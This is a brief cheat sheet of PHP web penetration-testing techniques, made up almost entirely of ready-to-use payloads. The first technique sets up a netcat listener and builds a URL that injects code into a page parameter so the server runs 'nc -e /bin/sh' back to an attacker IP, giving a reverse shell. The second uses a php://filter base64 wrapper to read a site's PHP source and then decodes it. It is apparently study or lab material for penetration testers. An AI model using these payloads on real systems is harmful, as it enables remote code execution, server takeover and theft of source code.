# PHP Penteration Testing Techniques

### Obtaining Shell through Browser Bar
```
# If you get similar to ?page=index in the browser bar
# In your attacking machine
nc -nlvp 441

# In the browser bar. Replace 10.11.1.139 with your attacking IP.
http://thedomain.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%2010.11.1.139%20441%27)};%23
```
### Using php:// in url to return base64 encoded page source
```
# https://victimsite.com/somefile.php?pagename=whatever
https://victimsite.com/somefile.php?pagename=php://filter/convert.base64-encode/resource=somefile.php
# or
https://victimsite.com/somefile.php?pagename=php://filter/convert.base64-encode/resource=somefile

# Copy the returned base64 code and decode it
echo -n thebase64codethatwassuppliedbythephpfilterconvertbase64encode | base64 -d > somefile.php
```
